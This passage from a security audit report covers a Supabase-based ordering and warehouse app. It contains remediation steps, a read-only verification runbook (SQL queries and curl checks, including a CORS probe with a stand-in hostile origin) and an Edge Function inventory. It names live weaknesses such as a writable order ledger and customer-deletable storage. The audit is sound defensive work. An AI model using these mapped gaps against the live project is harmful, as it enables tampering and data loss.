| I-3 | **`demo-export/`** holds a full demo dataset including archived third-party emails. Correctly gitignored (`.gitignore:47`), on disk only. It is also the demo's only recovery path, so it must be retained — worth naming in the Data Classification Standard. | R-08 adjacent |

---

## 3. Corrections to `CLAUDE.md`

Documentation drift found while auditing. Each is a statement that is now false, and in the
first case the false statement is load-bearing — it is why DB-1 went unnoticed.

| Location | Claim | Reality |
|---|---|---|
| Lockdown table (`orders`, `order_items` → `place-order` → `00009`) and the follow-on note that *"Direct INSERT/UPDATE/DELETE from `authenticated` is blocked for the tables in the lockdown table"* | Both order tables fully locked | **Only INSERT (both tables) and UPDATE (`orders`) are blocked.** `order_items` UPDATE/DELETE and `orders` DELETE remain open, policy and grant. See DB-1 |
| *"The **eight** functions listed in `supabase/config.toml`"* | Eight `verify_jwt = false` | **Nine** — `embed-products` was added |
| `_shared/rateLimit.ts` described as a *"per-isolate in-memory limiter"* | In-memory | Postgres-backed via `rate_limit_hit()`, with in-memory as the **fallback** |
| *"Storage buckets: public read, `authenticated` write"*, warning that `FOR ALL TO anon` includes DELETE | The `anon` hazard is named | The surviving `authenticated` policy has the **identical shape** and the same DELETE hazard. STOR-1 |

**These are not edited by this audit.** A documentation correction belongs with the fix it
describes, not with the report that found it — correcting the text while the behaviour stands
would remove the only remaining signal that something is wrong.

---

## 4. What is well built

Recorded because an audit that lists only faults gives a false picture of the system, and
because several of these are load-bearing controls that must not be casually refactored.

- **The Edge Function auth core.** `_shared/auth.ts:53-104` verifies the bearer token with a
  real server-side `getUser()` round-trip and reads the role from `profiles`, never from a JWT
  claim. A caller cannot inject a role; a user cannot self-promote, because `00011:16` revokes
  `UPDATE (role, horeca_id)` at **column** level — which beats the row-level `WITH CHECK` that
  would otherwise have permitted it. The grant, not the policy, is the control there.
- **All nine `verify_jwt = false` functions carry a real in-body gate**, and every token
  comparison is constant-time. This was a finding in July; it is closed.
- **CORS fails closed.** `_shared/cors.ts` never emits a wildcard, never sets
  `Access-Control-Allow-Credentials`, echoes an origin only on exact allow-list match, and
  refuses everything when `ALLOWED_ORIGINS` is unset.
- **No SQL injection surface.** Zero raw SQL in the functions; all seventeen `EXECUTE`
  statements operate on identifiers drawn from `pg_catalog` with `%I` quoting; every
  caller-supplied batch arrives through `jsonb_to_recordset` with a declared row type.
- **OAuth is done properly.** AES-256-GCM with a fresh random IV per call and an asserted key
  length; refresh tokens stored as ciphertext with a `CHECK` constraint that rejects five known
  plaintext prefixes (`00018:41-49`); single-use `DELETE … RETURNING` state claim with expiry
  and race detection; `PO_OAUTH_APP_BASE` validated against the origin allow-list, closing the
  open redirect.
- **The recovery and invite flow.** `recoveryLink.ts` deliberately does not claim `?code=`, so
  it cannot hijack the PO-Inbox OAuth callback. `pendingPasswordSet.ts` is written *before*
  the URL is cleared. Every exit from the screen ends the session and then **re-reads
  `getSession()` to confirm the sign-out took**. This is careful work.
- **The PDF viewer pins the blob MIME type** (`lib/pdfObjectUrl.ts:38`) regardless of what the
  server returned, which is what makes iframing an untrusted document safe.
- **Zero `dangerouslySetInnerHTML`** in a codebase of this size, and a correctly two-sided
  `postMessage` origin check.
- **The read-side lockdown (`00105`) is thorough.** All eight `USING (true)` policies it
  targeted are genuinely dropped; `user_is_staff()` fails closed via `COALESCE(…, FALSE)`;
  `00104` pinned `search_path` on the two functions everything now rests on. The remaining
  `app_settings` exception is correctly reasoned — RLS filters rows, and this needs columns.
- **Every `inv_*` and `wie_*` mutation RPC is revoked from `PUBLIC, anon, authenticated` and
  granted only to `service_role`.** I checked all forty-odd. No gap. This is the strongest part
  of the schema.
- **The workspace and tenant isolation model.** Credentials-as-the-wall rather than
  rules-as-the-wall, with the hook as defence in depth, and a demo on a genuinely separate
  Supabase account and organisation.
- **CI touches no secrets at all** and blocks on every step.

---

## 5. Sequenced remediation

Ordered by exposure reduced per unit of work. Items 1–3 are the ones a client is exposed to now.

| # | Action | Effort | Closes |
|---|---|---|---|
| 0 | **Decide on deploying `rel-2026-08-17-auth`.** Frontend-only, seven files, against the commit already live | minutes | §1 |
| 1 | Run **Appendix A** in the tenant workspace. Steps 3 and 4 change the severity of DB-3 and STOR-2 | ~30 min | evidence for all `[source]` findings |
| 2 | ~~One migration: drop the three order policies, revoke the two grants~~ **DONE 2026-08-19** (`00111` + `00112`; the revoke also covers `anon` and `TRUNCATE`, and `cancel-order` replaces the removed capability) | small | DB-1 |
| 3 | One migration: per-verb, role-gated storage policies; `signatures` + `visit-photos` to private | small | STOR-1, STOR-2, R-02 |
| 4 | `send-email` gate ordering; XFF derivation in `rateLimit.ts` | small | FN-1, FN-2 |
| 5 | `security_invoker` on `handling_unit_anomalies`; staff check on the two `00084` functions; NULL-fails-closed in `wie_replen_config_rows` | small | DB-2, DB-4, DB-5 |
| 6 | CSP reporting endpoint → observe → enforce; tighten `check-csp.mjs` | medium | CSP-1, CSP-2, R-12 |
| 7 | `queryClient.clear()` on sign-out; CSV formula guard | trivial | CL-1, CL-2 |
| 8 | CI assertions: demo-login flag, `dist/` grep, CSP mode, direct-write drift | small | CI-1, R-01, R-18 |
| 9 | Warehouse site-scope on the seven functions; generic error envelope; `invite-user` onto `requireAuth` + zod | medium | FN-3, FN-4, FN-5, R-17 |
| 10 | `REVOKE` sweep and default-privilege lockdown — **only if Appendix A step 3 confirms it** | medium | DB-3 |

Items 2, 3, 4, 5 and 7 are together perhaps a day of work and close every High and most of the
Mediums. Item 6 is the long pole and is already correctly sequenced in R-12.

---

## Appendix A — Live verification runbook

**Run from the tenant workspace `C:\Users\dulsh\nexorder-amadiya`**, which is the only checkout
holding `.env.amadiya.local`. Every command below is read-only: they are `SELECT`s, a dry run,
three check-only scripts and two unauthenticated HTTP requests. None writes.

Paste the output back and the corresponding findings can be re-marked `[verified live]`.

**1 — Which migrations are actually applied?** Settles whether the database leads the frontend.

```bash
node supabase/migrate.mjs --env=amadiya --dry-run
```

*Expect:* either "nothing pending" (the database carries `00106`–`00110` and is ahead of the
deployed frontend) or those five listed as pending. Either is actionable; not knowing is not.

**2 — DB-1: are the order-write policies live?**

```bash
node supabase/apply-sql.mjs --env=amadiya --query "SELECT tablename, policyname, cmd, roles FROM pg_policies WHERE schemaname='public' AND tablename IN ('orders','order_items') ORDER BY tablename, cmd;"
node supabase/apply-sql.mjs --env=amadiya --query "SELECT table_name, privilege_type FROM information_schema.role_table_grants WHERE grantee='authenticated' AND table_name IN ('orders','order_items') ORDER BY 1,2;"
```

*Expect, if DB-1 holds:* `orders_delete_admin`, `order_items_update_admin_manager`,
`order_items_delete_admin_manager` present, and INSERT/UPDATE/DELETE granted on both tables.

**3 — DB-3: does `anon` hold write grants?** This one decides whether DB-3 is High or moot.

```bash
node supabase/apply-sql.mjs --env=amadiya --query "SELECT privilege_type, count(*) AS tables FROM information_schema.role_table_grants WHERE grantee='anon' AND table_schema='public' GROUP BY 1 ORDER BY 1;"
node supabase/apply-sql.mjs --env=amadiya --query "SELECT defaclrole::regrole AS grantor, defaclacl FROM pg_default_acl d JOIN pg_namespace n ON n.oid=d.defaclnamespace WHERE n.nspname='public';"
```

*Expect, if DB-3 holds:* INSERT/UPDATE/DELETE counts in the dozens, and a `pg_default_acl` row
naming `anon`. If `anon` shows only a handful of SELECTs, DB-3 collapses to informational.

**4 — STOR-1/STOR-2: bucket visibility and policies.** The most important check here — R-02 is
recorded as closed and the migrations contain no such change.

```bash
node supabase/apply-sql.mjs --env=amadiya --query "SELECT id, public, allowed_mime_types FROM storage.buckets ORDER BY id;"
node supabase/apply-sql.mjs --env=amadiya --query "SELECT policyname, cmd, roles, qual FROM pg_policies WHERE schemaname='storage' AND tablename='objects' ORDER BY policyname;"
```

*Expect, if R-02 really is closed:* `signatures` and `visit-photos` with `public = false`, and
no `FOR ALL TO authenticated` policy. If they are still `public = true` with the `auth_write_*`
policies present, R-02 must be reopened.

**5 — DB-2: view security mode.**

```bash
node supabase/apply-sql.mjs --env=amadiya --query "SELECT c.relname, c.reloptions FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace WHERE n.nspname='public' AND c.relkind='v';"
```

*Expect:* `v_bin_fill` carries `{security_invoker=true}`; `handling_unit_anomalies` and
`v_held_locations` carry nothing.

**6 — DB-4/DB-5/L-4: function grants.**

```bash
node supabase/apply-sql.mjs --env=amadiya --query "SELECT p.proname, pg_get_userbyid(p.proowner) AS owner, p.prosecdef, p.proacl FROM pg_proc p JOIN pg_namespace n ON n.oid=p.pronamespace WHERE n.nspname='public' AND p.proname IN ('wie_layout_label_targets','wie_layout_label_status','wie_replen_config_rows','default_tenant','user_is_staff');"
```

*Expect, if DB-4 holds:* `prosecdef = t` on the two label functions with `authenticated=X` in
`proacl`.

**7 — Platform configuration.** All three are check-only and exit non-zero on drift.

```bash
npm run secrets:check:amadiya
npm run auth:config:check:amadiya
npm run crons:list:amadiya
```

*Expect:* secrets complete; auth config matching `buildDesired()` including
`password_min_length` and `disable_signup` (L-9); seven crons.

**8 — CORS: a hostile origin must get nothing.**

```bash
for fn in health log-client-error place-order; do
  echo "--- $fn"
  curl -s -o /dev/null -D - -X OPTIONS \
    -H "Origin: https://evil.example" \
    -H "Access-Control-Request-Method: POST" \
    "https://lsgkznyiabqitqfpveey.supabase.co/functions/v1/$fn" \
    | grep -i "access-control-allow-origin" || echo "  (no ACAO — correct)"
done
```

*Expect:* no `Access-Control-Allow-Origin` on any of the three. An ACAO echoing
`https://evil.example` is a critical finding; an ACAO present for `https://nexorder.com.au`
when that origin is sent is correct.

**9 — STOR-2 in the open.** Take any object path from step 4's bucket listing and fetch it with
no credentials:

```bash
curl -s -o /dev/null -w "%{http_code}\n" \
  "https://lsgkznyiabqitqfpveey.supabase.co/storage/v1/object/public/signatures/<path>"
```

*Expect, if the bucket is private:* `400` or `404`. A `200` confirms STOR-2 live.

---

## Appendix B — Edge Function inventory

71 functions. `vj` = `verify_jwt` in `supabase/config.toml`. Roles: `A` Admin, `M` Manager,
`W` Warehouse, `FSR`/`OSR` Field/Office Sales Rep, `C` Restaurant/Hotel Customer.
`+scope` = additionally checks `home_warehouse_id`. All line references are to that function's
`index.ts` unless noted.

| Function | vj | Gate | Roles | Rate limit | zod |
|---|---|---|---|---|---|
| adjust-stock | T | `requireAuth:69` | A,M,W `+scope:102` | 30/min | Y |
| approve-po | **F** | `:154` service · `:161` requireAuth | service / A,M | 30/min (human) | manual |
| assign-replenishment | T | `:35` | A,M,W `+scope:57` | 120/min | Y |
| commit-reslot-plan | T | `:45` | A,M | 20/min | Y |
| complete-putaway | T | `:80` | A,M,W `+scope:108` | 120/min | Y |
| complete-replenishment | T | `:86` | A,M,W `+scope:117` | 120/min | Y |
| confirm-label-print | T | `:47` | A,M,W **no scope** | per-user | Y |
| count-bin | T | `:127` | A,M,W `+scope:181` | 20/min | Y |
| create-floorplan-upload-url | T | `:48` | A | 60/min | Y |
| create-order-document-url | T | `:46` | A,M,W **no scope** | 120/min | Y |
| create-po-document-url | T | `:66` | A,M | 120/min | manual |
| decide-putaway | T | `:96` | A,M,W `+scope:124` | 120/min | Y |
| decide-slotting-suggestion | T | `:34` | A,M | 120/min | Y |
| detect-replenishment | T | `:34` | A,M,W `+scope:45` | 30/min | Y |
| disconnect-email-account | T | `:49` | A,M | per-user | manual |
| embed-products | **F** | `:63-68` service ‖ cron | service/cron | **none** | Y |
| extract-floorplan | T | `:144` | A | 5/min | Y |
| extract-po | **F** | `:95` → `:155` service | service | **none** | manual |
| generate-dispatch-advice | T | `:31` | A,M,W **no scope** | per-user | Y |
| generate-labels | T | `:703` | A,M,W **no scope** | 10/min | Y |
| generate-pick-slip | T | `:30` | A,M,W **no scope** | per-user | Y |
| gmail-oauth-callback | **F** | OAuth state, `callbackCommon.ts:244` | — | 30/min/IP | n/a |
| health | **F** | GET **none** · POST `:104` cron | — | GET 10/min/IP · POST none | n/a |
| invite-user | T | **inline** `:120-132` | A | 5/min | **none** |
| log-client-error | **F** | **none, by design** | anon | 30/min/IP | Y |
| mutate-app-settings | T | `:56` | A | per-user | Y |
| mutate-horeca | T | `:91` | A,M | per-user | Y |
| mutate-horeca-address | T | `:80` | A,M | per-user | Y |
| mutate-invoice-status | T | `:70` | A,M | per-user | Y |
| mutate-layout | T | `:309` | A | 120/min | Y |
| mutate-level-role | T | `:167` | A | 60/min | Y |
| mutate-pantry-item | T | `:94` | A,M,FSR,OSR,C own-horeca `:127` | 60/min | Y |
| mutate-po-alias | T | `:173` | A,M | per-user | Y |
| mutate-product | T | `:265` | A,M | per-user | Y |
| mutate-product-home-bin | T | `:106` | A,M | 30/min + 10/min `:bulk` | Y |
| mutate-profile | T | `:37` | A | 30/min | Y |
| mutate-promotion | T | `:184` | A,M | per-user | Y |
| mutate-purchase-order | T | `:104` | A,M | per-user | Y |
| mutate-sales-target | T | `:109` | A,M | per-user | Y |
| mutate-scoring-profile | T | `:46` | A | 30/min | Y |
| mutate-storage-type | T | `:143` | A | 60/min | Y |
| mutate-supplier | T | `:68` | A,M | per-user | Y |
| mutate-warehouse | T | `:169` | A,M | per-user | Y |
| mutate-warehouse-location | T | `:540` | A,M | 30/min + 5 sub-buckets | Y |
| mutate-warehouse-setup-ack | T | `:97` | A,M | per-user | Y |
| mutate-wie-rule | T | `:80` | A | 120/min | Y |
| mutate-wms-attributes | T | `:53` | A,M | 120/min | Y |
| mutate-zone-profile | T | `:55` | A | 60/min | Y |
| order-pick-tasks | T | `:38` | A,M,W **no scope** | 120/min | Y |
| outlook-oauth-callback | **F** | OAuth state | — | 30/min/IP | n/a |
| pause-email-account | T | `:41` | A,M | per-user | manual |
| place-order | T | **inline** `:256-277` | A,M,FSR,OSR,C own-horeca `:269` | 10/min | **none** |
| plan-reslot | T | `:54` | A,M | 20/min | Y |
| poll-inbox | **F** | `:39` cron token | cron | **none** | n/a |
| publish-layout | T | `:49` | A | 20/min | Y |
| receive-stock | T | `:246` | A,M,W `+scope:292` | 30/min | Y |
| recommend-pick-route | T | `:36` | A,M,W `+scope:47` | 60/min | Y |
| recommend-putaway | T | `:48` | A,M,W `+scope:62` | 60/min | Y |
| recommend-putaway-route | T | `:39` | A,M,W `+scope:50` | 60/min | Y |
| recommend-replen-route | T | `:45` | A,M,W `+scope:56` | 60/min | Y |
| record-pick | T | `:53` | A,M,W `+scope:87` | 120/min | Y |
| reject-po | T | `:36` | A,M | 30/min | manual |
| release-quarantine | T | `:78` | A,M,W **no scope** | 30/min | Y |
| retry-email-account | T | `:48` | A,M | per-user | manual |
| send-email | **F** | `:91` service — **after** the limiter, FN-1 | service | 20/min/IP | Y |
| start-po-oauth | T | `:49` | A,M | 10/min | manual |
| transfer-stock | T | `:37` | A,M | 60/min | Y |
| unassign-replenishment | T | `:36` | A,M,W `+scope:54` | 120/min | Y |
| update-order-status | T | **inline** `:113-146` | A,M,W `+scope:262` | 60/min | **none** |
| wie-batch-reoptimize | T | `:95` | A,M | 6/min | Y |
| wie-simulate | T | `:200` | A,M | 20/min | Y |

**Totals.** 66 use `requireAuth`; 4 hand-roll an equivalent gate (`invite-user`, `place-order`,
`update-order-status`, and `approve-po`'s service branch); 2 are intentionally ungated
(`log-client-error`, `health` GET). **No function is missing a gate it should have.** 57
validate with zod, 11 use adequate manual type checks, 3 take no body. 68 apply a rate limit;
the 3 without are service-role or cron only. The nineteen functions marked **no scope** or
**none** are the actionable rows: FN-3 and FN-5.

---

## Appendix C — Risk register reconciliation

Against `Compliance/_src/15-risk-register.md`. Every R-01…R-26 is accounted for.

**Confirmed closed by this audit**

| ID | Basis |
|---|---|
| R-01 | Demo credentials — **`[verified live]`** absent from the production bundle. Residual: no build-time assertion (L-2), which is the register's own stated treatment |

**Confirmed still open, with new evidence**

| ID | Evidence added |
|---|---|
| R-12 | CSP — **`[verified live]`**: Report-Only *and* no reporting endpoint, so it neither blocks nor informs. CSP-2 adds that the CI guard cannot detect either fact |
| R-14 | Rate limiter — FN-1 (ordering) and FN-2 (spoofable key) are new failure modes beyond the documented fail-open |
| R-17 | Schema validation — the fifteen unvalidated bodies now enumerated in Appendix B; `invite-user`'s unvalidated `avatarUrl` (FN-5) is the sharp edge |
| R-18 | Pipeline — CI-1 adds four specific assertions the pipeline could make and does not |
| R-19 | `app_settings` — confirmed the **only** remaining `USING (true)` policy. Seventeen readable columns; five are internal. One consequence not previously stated: a customer reading `po_auto_approve_block_on_sender_mismatch = false` learns that a spoofed sender will auto-approve a purchase order |
| R-03 | Offboarding — DB-5 shows a concrete consequence: a deleted `profiles` row leaves a valid JWT whose NULL role **passes** `wie_replen_config_rows`' gate |
| R-06, R-07, R-08 | Retention and audit completeness — unchanged, and DB-1 adds a privileged mutation path that writes no audit event at all |
| R-05, R-09, R-10, R-11, R-13, R-15, R-16, R-20 | No change; not re-examined except where noted (R-11 gains CL-1 as a session-hygiene instance) |
| R-21…R-26 | Governance, key-person, object-storage backup, Edge Function type-checking, DNS, PITR — out of scope for a code audit; R-23 gains weight from STOR-1, since a logical deletion of signatures is now shown to be reachable by a customer login |

**Requires correction**

| ID | Issue |
|---|---|
| **R-02** | Recorded *"closed, pending verification evidence — buckets made private, access through audited signed URLs."* **No migration in this repository makes that change**, and `00004`/`00024` still set `public = true` with `FOR ALL TO authenticated` write policies. Either the change was applied directly to the production project outside the migration ledger — itself a finding, and one R-13's change-management policy would flag — or R-02 is closed in error. **Appendix A step 4 settles it.** A risk closed without evidence is exactly what the register's own maintenance rule forbids |

**Proposed additions**

| Proposed | Finding | Suggested score |
|---|---|---|
| R-27 | A cut release, including a security hotfix, is not observed to have reached the tenant | 16 |
| R-28 | The order ledger is directly writable, producing no audit event and corrupting inventory balances | 15 |
| R-29 | Default privileges may make RLS the sole access gate rather than one of two — **pending Appendix A step 3** | 12 (provisional) |
| R-30 | CSV exports carry externally supplied text with no formula-injection guard | 8 |

---

*Prepared 2026-08-19 against `nexorder.com.au` @ `8617bbc`. Findings marked `[source]` are
statements about this repository; Appendix A converts them into statements about the running
system, and should be run before this report is treated as final.*
